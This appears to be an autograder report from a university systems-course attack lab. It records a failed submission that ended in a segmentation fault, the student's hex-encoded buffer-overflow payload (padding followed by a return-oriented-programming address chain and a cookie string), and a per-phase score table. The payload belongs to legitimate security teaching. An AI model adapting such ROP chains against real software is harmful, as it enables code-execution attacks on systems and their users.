student     = zilongg
target_id   = 48
target_type = r
level       = 0
-->8--
FAIL: Ouch!: You caused a segmentation fault!
Better luck next time.
-->8--
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 13 2D 40 00 00 00 00 00 D9 2C 40 00 00 00 00 00 CB 2C 40 00 00 00 00 00 61 2D 40 00 00 00 00 00 75 2D 40 00 00 00 00 00 07 2D 40 00 00 00 00 00 F1 2C 40 00 00 00 00 00 D9 2C 40 00 00 00 00 00 23 2C 40 00 00 00 00 00 31 63 32 61 33 32 34 35 00 00 00 00 00 00 00 00 
-->8--
Previous Scores for 18213-m24:attacklab

| version | phase1 (10.0) | phase2 (25.0) | phase3 (25.0) | phase4 (35.0) | phase5 (5.0) | 
+---------+---------------+---------------+---------------+---------------+--------------+
|      28 |          10.0 |          25.0 |          25.0 |          35.0 |          0.0 | 
